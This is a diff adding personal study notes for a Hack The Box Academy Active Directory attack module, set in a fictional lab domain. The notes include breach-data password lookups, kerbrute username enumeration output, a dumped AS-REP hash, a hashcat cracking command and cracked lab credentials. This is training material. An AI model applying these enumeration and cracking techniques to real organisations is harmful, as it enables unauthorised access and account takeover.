@@ -3115,3 +3115,176 @@ Reply from 172.16.10.5: bytes=32 time<1ms TTL=128
 ### Completion
 
 [Link of Completion](https://academy.hackthebox.com/achievement/713396/158)
+
+## Active Directory Enumeration & Attacks
+
+### Scenario
+
+**In Scope**
+| Range/Domain | Description |
+| ------------------------------- | ----------------------------------------------------------------------------------------- |
+| `INLANEFREIGHT.LOCAL` | Customer domain to include AD and web services. |
+| `LOGISTICS.INLANEFREIGHT.LOCAL` | Customer subdomain |
+| `FREIGHTLOGISTICS.LOCAL` | Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL |
+| `172.16.5.0/23` | In-scope internal subnet. |
+
+**Out of Scope**
+
+- Any other subdomains of INLANEFREIGHT.LOCAL
+- Any subdomains of FREIGHTLOGISTICS.LOCAL
+- Any phishing or social engineering attacks
+- Any other IPS/domains/subdomains not explicitly mentioned
+- Any types of attacks against the real-world inlanefreight.com website outside of passive enumeration shown in this module
+
+### External Recon and Enumeration Principles
+
+| Data Point           | Description                                                                                                                                                                                                                                                                                                                                                                                                                                   |
+| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `IP Space`           | Valid ASN for our target, netblocks in use for the organization's public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc.                                                                                                                                                                                                                                                                            |
+| `Domain Information` | Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS/IDS in use, etc.)                                                                                                                      |
+| `Schema Format`      | Can we discover the organization's email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.                                                                                                                                                                |
+| `Data Disclosures`   | For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. For example, any published files that contain intranet site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.) |
+| `Breach Data`        | Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.                                                                                                                                                                                                                                                                                                                          |
+
+| Resource                       | Examples                                                                                                                                                                                                                                                                                                                                                                                                                                 |
+| ------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| ASN / IP registrars            | [IANA](https://www.iana.org/), [arin](https://www.arin.net/) for searching the Americas, [RIPE](https://www.ripe.net/) for searching in Europe, [BGP Toolkit](https://bgp.he.net/)                                                                                                                                                                                                                                                       |
+| Domain Registrars & DNS        | [Domaintools](https://www.domaintools.com/), [PTRArchive](http://ptrarchive.com/), [ICANN](https://lookup.icann.org/lookup), manual DNS record requests against the domain in question or against well known DNS servers, such as 8.8.8.8.                                                                                                                                                                                               |
+| Social Media                   | Searching Linkedin, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization.                                                                                                                                                                                                                                                                                 |
+| Public-Facing Company Websites | Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the "About Us" and "Contact Us" pages can also be gold mines.                                                                                                                                                                                                                                                       |
+| Cloud & Dev Storage Spaces     | GitHub, [AWS S3 buckets & Azure Blog storage containers](https://grayhatwarfare.com/), [Google searches using "Dorks"](https://www.exploit-db.com/google-hacking-database)                                                                                                                                                                                                                                                               |
+| Breach Data Sources            | [HaveIBeenPwned](https://haveibeenpwned.com/) to determine if any corporate email accounts appear in public breach data, [Dehashed](https://www.dehashed.com/) to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication. |
+
+**LOOT**
+
+- IP Address: 134.209.24.248
+- Mail Server: mail1.inlanefreight.com
+- Nameservers: NS1.inlanefreight.com & NS2.inlanefreight.com
+
+```sh
+woadey@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p
+
+id : 5996447501
+email : roger.grimes@inlanefreight.local
+username : rgrimes
+password : Ilovefishing!
+hashed_password :
+name : Roger Grimes
+vin :
+address :
+phone :
+database_name : ModBSolutions
+
+id : 7344467234
+email : jane.yu@inlanefreight.local
+username : jyu
+password : Starlight1982_!
+hashed_password :
+name : Jane Yu
+vin :
+address :
+phone :
+database_name : MyFitnessPal
+```
+
+### Initial Enumeration
+
+**LOOT**
+Hosts:
+
+- 172.16.5.5 (ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL)
+- 172.16.5.25
+- 172.16.5.50
+- 172.16.5.100 (ACADEMY-EA-CTX1.INLANEFREIGHT.LOCAL)
+- 172.16.5.125
+- 172.16.5.200
+- 172.16.5.225
+- 172.16.5.238
+- 172.16.5.240
+
+```sh
+┌─[✗]─[htb-student@ea-attack01]─[~]
+└──╼ $kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o users.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: dev (9cfb81e) - 03/30/24 - Ronnie Flathers @ropnop
+
+2024/03/30 20:24:55 >  Using KDC(s):
+2024/03/30 20:24:55 >  	172.16.5.5:88
+
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
+2024/03/30 20:24:55 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:71fe08c6abb69e7c4771d1402401ddaa$a83a808e1db12acb074905bb1b471bf5852a40bc63a6b0f869f5a094ef6c046159802fd90cb313b22eb1f8b8ad1a039710a4f354e6fc77541dacfef164b19b321b7882e82e6cc226b2805c50e3e15115fdbe07b43b0b035ac85dc0b33cc489263999433b88725152114e3bc01d2321b879e04c31277a316aac44808d8aaaa6bfabcdb153d83b2c2cc68ef3e2b7005e3cb390fbc45ed557e6a5d80699fe9f9761558ac6f216f9dddfe2c4e7162389f72eadc3f696a8952bbac270fc0360fe832ec791df58e27f428da47ed4b1b0165d3a4f91ba99fe2d9c96b1b1c4a160da332abd1b58a155b08cf8bcfc9f97c84fcc5ebb7144402ce062562e5171fa32fa7ee4f4fcfcc9672f856ac53d
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 mmorgan@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 rramirez@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 jwallace@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 jsantiago@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 gdavis@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 mrichardson@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 mharrison@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 tgarcia@inlanefreight.local
+2024/03/30 20:24:55 >  [+] VALID USERNAME:	 jmay@inlanefreight.local
+2024/03/30 20:24:56 >  [+] VALID USERNAME:	 jmontgomery@inlanefreight.local
+2024/03/30 20:24:56 >  [+] VALID USERNAME:	 jhopkins@inlanefreight.local
+2024/03/30 20:24:56 >  [+] VALID USERNAME:	 dpayne@inlanefreight.local
+2024/03/30 20:24:56 >  [+] VALID USERNAME:	 mhicks@inlanefreight.local
+2024/03/30 20:24:56 >  [+] VALID USERNAME:	 adunn@inlanefreight.local
+2024/03/30 20:24:56 >  [+] VALID USERNAME:	 lmatthews@inlanefreight.local
+2024/03/30 20:24:56 >  [+] VALID USERNAME:	 avazquez@inlanefreight.local
+2024/03/30 20:24:56 >  [+] VALID USERNAME:	 mlowe@inlanefreight.local
+2024/03/30 20:24:56 >  [+] VALID USERNAME:	 jmcdaniel@inlanefreight.local
+2024/03/30 20:24:56 >  [+] VALID USERNAME:	 csteele@inlanefreight.local
+2024/03/30 20:24:56 >  [+] VALID USERNAME:	 mmullins@inlanefreight.local
+2024/03/30 20:24:57 >  [+] VALID USERNAME:	 mochoa@inlanefreight.local
+2024/03/30 20:24:57 >  [+] VALID USERNAME:	 aslater@inlanefreight.local
+2024/03/30 20:24:57 >  [+] VALID USERNAME:	 ehoffman@inlanefreight.local
+2024/03/30 20:24:57 >  [+] VALID USERNAME:	 ehamilton@inlanefreight.local
+2024/03/30 20:24:57 >  [+] VALID USERNAME:	 cpennington@inlanefreight.local
+2024/03/30 20:24:58 >  [+] VALID USERNAME:	 srosario@inlanefreight.local
+2024/03/30 20:24:58 >  [+] VALID USERNAME:	 lbradford@inlanefreight.local
+2024/03/30 20:24:58 >  [+] VALID USERNAME:	 halvarez@inlanefreight.local
+2024/03/30 20:24:58 >  [+] VALID USERNAME:	 gmccarthy@inlanefreight.local
+2024/03/30 20:24:58 >  [+] VALID USERNAME:	 dbranch@inlanefreight.local
+2024/03/30 20:24:58 >  [+] VALID USERNAME:	 mshoemaker@inlanefreight.local
+2024/03/30 20:24:59 >  [+] VALID USERNAME:	 mholliday@inlanefreight.local
+2024/03/30 20:24:59 >  [+] VALID USERNAME:	 ngriffith@inlanefreight.local
+2024/03/30 20:24:59 >  [+] VALID USERNAME:	 sinman@inlanefreight.local
+2024/03/30 20:24:59 >  [+] VALID USERNAME:	 minman@inlanefreight.local
+2024/03/30 20:24:59 >  [+] VALID USERNAME:	 rhester@inlanefreight.local
+2024/03/30 20:24:59 >  [+] VALID USERNAME:	 rburrows@inlanefreight.local
+2024/03/30 20:25:00 >  [+] VALID USERNAME:	 dpalacios@inlanefreight.local
+2024/03/30 20:25:00 >  [+] VALID USERNAME:	 strent@inlanefreight.local
+2024/03/30 20:25:01 >  [+] VALID USERNAME:	 fanthony@inlanefreight.local
+2024/03/30 20:25:01 >  [+] VALID USERNAME:	 evalentin@inlanefreight.local
+2024/03/30 20:25:01 >  [+] VALID USERNAME:	 sgage@inlanefreight.local
+2024/03/30 20:25:02 >  [+] VALID USERNAME:	 jshay@inlanefreight.local
+2024/03/30 20:25:03 >  [+] VALID USERNAME:	 jhermann@inlanefreight.local
+2024/03/30 20:25:03 >  [+] VALID USERNAME:	 whouse@inlanefreight.local
+2024/03/30 20:25:03 >  [+] VALID USERNAME:	 emercer@inlanefreight.local
+2024/03/30 20:25:04 >  [+] VALID USERNAME:	 wshepherd@inlanefreight.local
+2024/03/30 20:25:05 >  Done! Tested 48705 usernames (56 valid) in 10.038 seconds
+```
+
+`mmorgan@INLANEFREIGHT.LOCAL:Welcome!00`
+
+### LLMNR/NBT-NS Poisoning
+
+**LOOT**
+`./hashcat.exe -m 5600 -a 0 hashes/[target-hash].hash rockyou.txt`
+MSSQL: `FOREND:Klmcargo2`
+SMB: `wley:transporter@4`
+NTLMv2: `backupagent:h1backup55`
+NTLMv2: `svc_qualys:security#1`
